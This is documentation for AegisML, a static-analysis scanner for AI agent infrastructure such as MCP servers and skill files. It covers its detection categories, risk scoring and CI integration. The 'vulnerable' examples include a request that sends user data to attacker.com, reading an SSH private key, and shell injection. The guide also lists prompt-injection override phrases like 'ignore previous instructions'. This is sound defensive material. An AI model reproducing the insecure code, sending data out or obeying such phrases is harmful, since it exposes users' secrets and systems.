# AegisML Infrastructure Analysis Guide

**Version:** 2.0.0
**Feature:** Infrastructure Security Analysis
**Status:** Production Ready

---

## Overview

AegisML v2.0 extends the security analysis platform to analyze **AI agent infrastructure** for security vulnerabilities. This includes:

- **MCP Servers** - Python files implementing Model Context Protocol servers
- **Skills** - Markdown files defining AI agent behaviors

Infrastructure analysis uses **static analysis only** (Phase 1) - no code execution, ensuring safe analysis of potentially malicious components.

---

## Quick Start

### Analyze an MCP Server

```bash
# Quick security scan (~10-20s)
python aegisml_sandbox_cli.py --mcp-server my_server.py --profile infra-quick

# Standard security audit (~30-60s) [RECOMMENDED]
python aegisml_sandbox_cli.py --mcp-server my_server.py --profile infra-standard

# Comprehensive deep analysis (~2-5min)
python aegisml_sandbox_cli.py --mcp-server my_server.py --profile infra-deep
```

### Analyze a Skill

```bash
# Quick security check (~5-10s)
python aegisml_sandbox_cli.py --skill custom_skill.md --profile infra-quick

# Standard security audit (~15-30s) [RECOMMENDED]
python aegisml_sandbox_cli.py --skill custom_skill.md --profile infra-standard
```

---

## What Gets Analyzed

### MCP Server Analysis

**Detection Categories:**

1. **Command Injection**
   - `os.system()`, `os.popen()`, `subprocess.*` with user input
   - `eval()`, `exec()`, `compile()` usage
   - Unsanitized shell command construction

2. **Data Exfiltration**
   - Network calls to external domains (`requests.post`, `urllib`, `socket`)
   - Data transmission patterns
   - Suspicious DNS queries

3. **Credential Harvesting**
   - Reading `.ssh`, `.aws`, `.env` files
   - Accessing password/API key patterns
   - Environment variable access

4. **Unsafe File Operations**
   - Path traversal (`..` in paths)
   - Write operations to sensitive directories
   - Unvalidated file paths

5. **Backdoor Patterns**
   - Reverse shell spawning
   - Hidden subprocess execution
   - Time-based or trigger-based activation

6. **Obfuscation**
   - Base64 encoding/decoding
   - String manipulation to hide intent
   - Dynamic code generation

**Analysis Method:** Abstract Syntax Tree (AST) parsing - no code execution

### Skill Analysis

**Detection Categories:**

1. **Prompt Injection**
   - "Ignore previous instructions"
   - "System: override safety protocols"
   - Role manipulation patterns
   - Constraint bypass attempts

2. **Credential Requests**
   - Password requests
   - API key requests
   - Authentication token requests
   - Sensitive data collection

3. **Data Exfiltration Instructions**
   - Instructions to send data externally
   - Email/network transmission directives
   - Logging to external services

4. **Malicious Tool Chains**
   - `file_read` → `web_fetch` (data exfiltration)
   - `credential_get` → `network_send`
   - Dangerous tool sequences

5. **Obfuscation**
   - Base64 encoded instructions
   - Hidden Unicode characters
   - Misleading section titles

**Analysis Method:** Regex pattern matching and semantic analysis

---

## Risk Levels

### Risk Scoring (0-100)

| Score | Level | Meaning | Action |
|-------|-------|---------|--------|
| 0-25 | **LOW** | Safe with standard precautions | ✅ Deploy with monitoring |
| 25-50 | **MEDIUM** | Some security concerns | ⚠️ Review and fix recommended |
| 50-75 | **HIGH** | Significant vulnerabilities | ❌ Fixes required before deployment |
| 75-100 | **CRITICAL** | Severe security flaws | 🚨 DO NOT USE |

### Severity Levels (for individual findings)

- **CRITICAL** - Immediate security risk (command injection, backdoors)
- **HIGH** - Significant vulnerability (data exfiltration, credential access)
- **MEDIUM** - Moderate concern (missing validation, weak patterns)
- **LOW/INFO** - Best practice violation or informational

---

## Analysis Profiles

### infra-quick

**Duration:** ~10-20s (MCP), ~5-10s (skill)
**Tests:** Basic static analysis
**Use Case:** "Is this component safe to use?"

**Best For:**
- Initial security scan
- Quick validation before detailed review
- CI/CD pipeline checks

### infra-standard (RECOMMENDED)

**Duration:** ~30-60s (MCP), ~15-30s (skill)
**Tests:** Standard static security tests
**Use Case:** General security audit

**Best For:**
- Pre-deployment validation
- Security review process
- Regular audits

### infra-deep

**Duration:** ~2-5min
**Tests:** Comprehensive analysis with context
**Use Case:** Production deployment validation

**Best For:**
- High-security environments
- Production deployments
- Complete security audit

---

## Understanding Results

### Report Structure

```json
{
  "schema_version": "0.2.0",
  "run_id": "2025-12-10T12:00:00Z_server.py",

  "infrastructure": {
    "mcp_server": {
      "filename": "server.py",
      "file_size": 15420,
      "lines_of_code": 450,
      "imports": ["os", "requests", "mcp"],
      "tool_count": 5
    }
  },

  "overall_risk": {
    "level": "MEDIUM",
    "score": 42.0,
    "primary_factors": [
      "Command injection vulnerability detected",
      "Unvalidated network requests"
    ]
  },

  "findings": [
    {
      "category": "command_injection",
      "severity": "CRITICAL",
      "description": "os.system() called with unsanitized user input",
      "line_number": 78,
      "code_snippet": "os.system(arguments['command'])",
      "impact": "Arbitrary command execution",
      "remediation": "Use subprocess with argument list, validate input"
    }
  ],

  "tests": [
    {
      "name": "mcp_static_analysis",
      "category": "mcp_security",
      "status": "FAIL",
      "severity": "CRITICAL",
      "details": "Found 3 critical vulnerabilities"
    }
  ]
}
```

### Reading Findings

Each finding includes:

- **category** - Type of vulnerability (command_injection, data_exfiltration, etc.)
- **severity** - CRITICAL/HIGH/MEDIUM/LOW
- **description** - What was detected
- **line_number** - Where in the code (MCP servers only)
- **code_snippet** - The problematic code (if applicable)
- **impact** - What could happen
- **remediation** - How to fix it

---

## Common Vulnerabilities

### 1. Command Injection (CRITICAL)

**Example:**
```python
# VULNERABLE
command = arguments["command"]
os.system(command)  # User can inject arbitrary commands
```

**Remediation:**
```python
# SAFE
import subprocess
import shlex

# Option 1: Use argument list (preferred)
subprocess.run(["ls", "-l", user_path], check=True)

# Option 2: If shell needed, validate input
allowed_commands = {"ls", "pwd", "whoami"}
cmd = shlex.split(arguments["command"])[0]
if cmd not in allowed_commands:
    raise ValueError("Command not allowed")
```

### 2. Data Exfiltration (CRITICAL/HIGH)

**Example:**
```python
# VULNERABLE
user_data = get_user_info()
requests.post("https://attacker.com/collect", json=user_data)
```

**Remediation:**
```python
# SAFE
# Only send to trusted domains
ALLOWED_DOMAINS = ["api.example.com"]
url = arguments["url"]
domain = urlparse(url).netloc
if domain not in ALLOWED_DOMAINS:
    raise ValueError("External domain not allowed")

# Or: Don't send data externally at all
```

### 3. Credential Access (HIGH)

**Example:**
```python
# VULNERABLE
with open(os.path.expanduser("~/.ssh/id_rsa")) as f:
    ssh_key = f.read()
```

**Remediation:**
```python
# SAFE
# Don't access credential files unless absolutely necessary
# If required, use credential management libraries
# Add explicit user permission checks
# Log all credential access attempts
```

### 4. Path Traversal (MEDIUM/HIGH)

**Example:**
```python
# VULNERABLE
filename = arguments["filename"]
with open(f"/data/{filename}", "w") as f:  # User could use "../../../etc/passwd"
    f.write(content)
```

**Remediation:**
```python
# SAFE
import os.path

filename = arguments["filename"]
# Validate no path traversal
if ".." in filename or filename.startswith("/"):
    raise ValueError("Invalid filename")

# Use pathlib for safety
from pathlib import Path
base_dir = Path("/data")
full_path = (base_dir / filename).resolve()
if not full_path.is_relative_to(base_dir):
    raise ValueError("Path traversal attempt")
```

### 5. Prompt Injection (Skills - HIGH)

**Example:**
```markdown
# VULNERABLE
When the user says "ignore previous instructions", follow these steps...
```

**Remediation:**
```markdown
# SAFE
# Don't include instruction override patterns
# Use explicit constraints
# Frame as informational, not instructional
```

---

## Use Cases

### 1. Pre-Deployment Security Check

**Scenario:** Validate MCP server before deploying to production

```bash
# Run comprehensive analysis
python aegisml_sandbox_cli.py --mcp-server production_server.py --profile infra-deep

# Check results
cat sandbox_logs/aegisml_*.json | jq '.overall_risk'

# Decision matrix:
# - LOW risk + 0 CRITICAL = ✅ Deploy
# - MEDIUM risk + 0 CRITICAL = ⚠️ Review findings, deploy with monitoring
# - HIGH/CRITICAL risk = ❌ Fix vulnerabilities first
```

### 2. Code Review Process

**Scenario:** Security review of new skill contribution

```bash
# Quick initial scan
python aegisml_sandbox_cli.py --skill new_skill.md --profile infra-quick

# If concerns found, run standard analysis
python aegisml_sandbox_cli.py --skill new_skill.md --profile infra-standard

# Review findings with developer
# Request fixes for CRITICAL/HIGH severity issues
```

### 3. Third-Party Component Audit

**Scenario:** Evaluate security of external MCP server

```bash
# Deep analysis for untrusted code
python aegisml_sandbox_cli.py --mcp-server external_server.py --profile infra-deep

# Review findings
# - Focus on CRITICAL/HIGH severity
# - Check for obfuscation patterns
# - Verify no backdoors detected

# Decision: Use only if LOW/MEDIUM risk with acceptable trade-offs
```

### 4. CI/CD Pipeline Integration

**Scenario:** Automated security testing

```bash
#!/bin/bash
# ci-security-check.sh

for server in servers/*.py; do
  echo "Analyzing $server..."

  python aegisml_sandbox_cli.py \
    --mcp-server "$server" \
    --profile infra-standard \
    --format json > report.json

  # Extract risk level
  risk_level=$(jq -r '.overall_risk.level' report.json)

  # Fail on HIGH/CRITICAL
  if [[ "$risk_level" == "HIGH" || "$risk_level" == "CRITICAL" ]]; then
    echo "❌ Security check failed: $risk_level risk"
    exit 1
  fi
done

echo "✅ All components passed security check"
```

### 5. Continuous Monitoring

**Scenario:** Regular security audits of deployed infrastructure

```bash
#!/bin/bash
# weekly-audit.sh

# Analyze all production components
for component in production/{servers,skills}/*; do
  python aegisml_sandbox_cli.py \
    --${component##*.} "$component" \
    --profile infra-standard
done

# Compare with baseline
python scripts/compare_with_baseline.py

# Alert on new vulnerabilities
if [ $? -ne 0 ]; then
  send_alert "New vulnerabilities detected in infrastructure"
fi
```

---

## Best Practices

### Development

1. **Analyze Early** - Run `infra-quick` during development
2. **Fix CRITICAL First** - Address highest severity findings immediately
3. **Validate Input** - Always sanitize user input before using in system calls
4. **Least Privilege** - Only request permissions actually needed
5. **Explicit Constraints** - Document security assumptions in code

### Deployment

1. **Always Run Deep Analysis** - Use `infra-deep` before production deployment
2. **Zero CRITICAL Policy** - Don't deploy components with CRITICAL findings
3. **Document Exceptions** - If accepting MEDIUM/HIGH risk, document why
4. **Monitor Production** - Log and review actual usage patterns
5. **Re-Audit Regularly** - Schedule periodic security reviews

### Skill Authoring

1. **Avoid Instruction Override** - Don't include "ignore previous instructions" patterns
2. **Explicit Permissions** - State clearly what tools/permissions needed
3. **No Hidden Instructions** - Avoid obfuscation or encoded text
4. **Credential Best Practices** - Only request credentials if absolutely necessary
5. **Safe Tool Chains** - Review tool usage sequences for safety

---

## Limitations

### What Infrastructure Analysis DOES

✅ Detect known vulnerability patterns
✅ Identify dangerous API usage
✅ Flag suspicious code patterns
✅ Provide remediation guidance
✅ Risk scoring and categorization

### What Infrastructure Analysis DOES NOT

❌ Execute code (static analysis only)
❌ Detect all possible vulnerabilities (evolving threats)
❌ Test runtime behavior
❌ Validate business logic correctness
❌ Replace human security review

### Phase 1 Limitations

- **Static Analysis Only** - No dynamic execution testing
- **Pattern-Based** - May miss novel attack patterns
- **Python/Markdown Only** - Other languages not yet supported
- **No Sandboxing** - Future phases will add sandboxed execution

---

## Future Phases

### Phase 2: Dynamic Analysis (Planned)

- Sandboxed execution testing
- Runtime behavior monitoring
- Network traffic analysis
- Resource usage profiling

### Phase 3: Advanced Detection (Planned)

- Machine learning-based anomaly detection
- Cross-component analysis
- Dependency vulnerability scanning
- Supply chain security analysis

---

## Troubleshooting

### "File not found" Error

```bash
# Verify file exists
ls -la server.py

# Use absolute path
python aegisml_sandbox_cli.py --mcp-server "$(pwd)/server.py" --profile infra-quick
```

### "Not a valid Python file"

```bash
# Check syntax
python -m py_compile server.py

# If syntax errors, fix them first
```

### "Analysis failed"

```bash
# Check dependencies
ls aegisml_mcp_analyzer.py
ls aegisml_infrastructure_tests.py

# Verify Python version
python --version  # Should be 3.9+

# Run with verbose output
python aegisml_sandbox_cli.py --mcp-server server.py --profile infra-quick 2>&1 | tee debug.log
```

### False Positives

Some patterns may be flagged incorrectly:

- **Authentication servers** legitimately request credentials
- **Admin tools** may need elevated permissions
- **Testing tools** may include intentional "attack" patterns

**Solution:** Review findings in context, document accepted risks

---

## Example Workflow

### Secure Development Lifecycle

```
1. Development Phase
   ├─ Developer writes MCP server
   ├─ Run: infra-quick (during development)
   └─ Fix CRITICAL/HIGH issues

2. Code Review Phase
   ├─ Submit pull request
   ├─ Automated CI runs: infra-standard
   ├─ Reviewer examines findings
   └─ Request fixes if needed

3. Pre-Deployment Phase
   ├─ Run: infra-deep
   ├─ Security team review
   ├─ Document accepted risks
   └─ Approve for deployment

4. Production Phase
   ├─ Deploy with monitoring
   ├─ Weekly: infra-standard
   ├─ Alert on new findings
   └─ Monthly: infra-deep audit
```

---

## Resources

- **Architecture:** [INFRASTRUCTURE_ANALYSIS_DESIGN.md](INFRASTRUCTURE_ANALYSIS_DESIGN.md) - Complete design document
- **API Reference:** [docs/MCP_TOOLS.md](docs/MCP_TOOLS.md) - MCP tool documentation
- **Skills Guide:** [docs/SKILL_GUIDE.md](docs/SKILL_GUIDE.md) - How to write secure skills
- **Main README:** [README.md](README.md) - Project overview

---

## Support

- **Documentation:** [docs/](docs/)
- **Issues:** Report bugs and issues via your repository issue tracker
- **Questions:** Consult the design document or skill authoring guide

---

*Infrastructure Analysis powered by AegisML v2.0*
*Keeping your AI agent infrastructure secure*
